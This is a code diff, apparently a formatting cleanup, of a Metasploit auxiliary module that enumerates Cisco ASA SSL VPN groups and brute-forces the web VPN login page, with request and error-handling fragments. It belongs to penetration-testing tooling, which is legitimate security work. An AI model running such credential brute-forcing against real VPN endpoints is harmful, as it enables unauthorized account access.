@@ -79,30 +79,30 @@ class Metasploit3 < Msf::Auxiliary
   # Verify whether the connection is working or not
   def check_conn?
     begin
-      res = send_request_cgi(
-      {
-        'uri'       => '/',
-        'method'    => 'GET'
-      })
+      res = send_request_cgi('uri' => '/', 'method' => 'GET')
       print_good("#{peer} - Server is responsive...")
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused,
+           ::Rex::HostUnreachable,
+           ::Rex::ConnectionTimeout,
+           ::Rex::ConnectionError,
+           ::Errno::EPIPE
       return
     end
   end
 
   def enumerate_vpn_groups
-    res = send_request_cgi({
-      'uri'       => '/+CSCOE+/logon.html',
-      'method'    => 'GET',
-    })
+    res = send_request_cgi(
+            'uri' => '/+CSCOE+/logon.html',
+            'method' => 'GET',
+          )
 
     if res &&
        res.code == 302
 
-      res = send_request_cgi({
-        'uri'       => '/+CSCOE+/logon.html?fcadbadd=1',
-        'method'    => 'GET',
-      })
+      res = send_request_cgi(
+              'uri' => '/+CSCOE+/logon.html?fcadbadd=1',
+              'method' => 'GET',
+            )
     end
 
     groups = Set.new
@@ -120,18 +120,18 @@ class Metasploit3 < Msf::Auxiliary
 
   # Verify whether we're working with SSL VPN or not
   def is_app_ssl_vpn?    
-    res = send_request_cgi({
-      'uri'       => '/+CSCOE+/logon.html',
-      'method'    => 'GET',
-    })
+    res = send_request_cgi(
+            'uri' => '/+CSCOE+/logon.html',
+            'method' => 'GET',
+          )
 
     if res &&
        res.code == 302
 
-      res = send_request_cgi({
-        'uri'       => '/+CSCOE+/logon.html?fcadbadd=1',
-        'method'    => 'GET',
-      })
+      res = send_request_cgi(
+              'uri' => '/+CSCOE+/logon.html?fcadbadd=1',
+              'method' => 'GET',
+            )
     end
 
     if res &&
@@ -145,11 +145,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def do_logout(cookie)
-    res = send_request_cgi({
-      'uri'       => '/+webvpn+/webvpn_logout.html',
-      'method'    => 'GET',
-      'cookie'    => cookie
-    })
+    res = send_request_cgi(
+            'uri' => '/+webvpn+/webvpn_logout.html',
+            'method' => 'GET',
+            'cookie'    => cookie
+          )
   end
 
   # Brute-force the login page
@@ -175,13 +175,13 @@ class Metasploit3 < Msf::Auxiliary
 
       post_params['group_list'] = group unless group.empty?
 
-      resp = send_request_cgi({
-        'uri'       => '/+webvpn+/index.html',
-        'method'    => 'POST',
-        'ctype'     => 'application/x-www-form-urlencoded',
-        'cookie'    => cookie,
-        'vars_post' => post_params
-      })
+      resp = send_request_cgi(
+               'uri' => '/+webvpn+/index.html',
+               'method' => 'POST',
+               'ctype' => 'application/x-www-form-urlencoded',
+               'cookie' => cookie,
+               'vars_post' => post_params
+             )
 
       if resp &&
          resp.code == 200 &&
@@ -210,7 +210,11 @@ class Metasploit3 < Msf::Auxiliary
         vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")
       end
 
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused,
+           ::Rex::HostUnreachable,
+           ::Rex::ConnectionTimeout,
+           ::Rex::ConnectionError,
+           ::Errno::EPIPE
       print_error("#{peer} - HTTP Connection Failed, Aborting")
       return :abort
     end
